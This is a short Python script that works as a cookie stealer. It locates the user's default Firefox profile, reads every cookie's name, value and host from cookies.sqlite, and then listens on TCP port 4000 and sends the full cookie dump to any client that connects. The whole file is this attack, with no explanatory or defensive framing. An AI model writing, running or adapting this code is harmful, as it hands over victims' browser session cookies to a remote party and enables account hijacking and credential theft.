import sqlite3;
import os, socket;


def GetFirefoxCookies():


    homeDirectory = os.path.expanduser("~");

    os.chdir(homeDirectory)    
    os.chdir(".mozilla/firefox") 


    cookiesPath= "";

    for directory in os.listdir():

        if(".default" in directory and os.path.isdir(directory)):
            os.chdir(directory)    
            cookiesPath= os.getcwd() + "/cookies.sqlite";



    try:

        connection = sqlite3.connect(cookiesPath)
        cursor = connection.cursor()
        cursor.execute('SELECT name, value, host FROM moz_cookies')
        cookies = cursor.fetchall()
        connection.close()

        return cookies
    except Exception as e:

        print(e)



# Send cookies
serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM);


serverAddress = ('', 4000);
serverSocket.bind(serverAddress);
serverSocket.listen();


# Accept connections
clientSocket, clientAddress = serverSocket .accept();


cookies = GetFirefoxCookies()
cookies_data = str(cookies).encode()

clientSocket.sendall(cookies_data)



clientSocket.close();
serverSocket.close();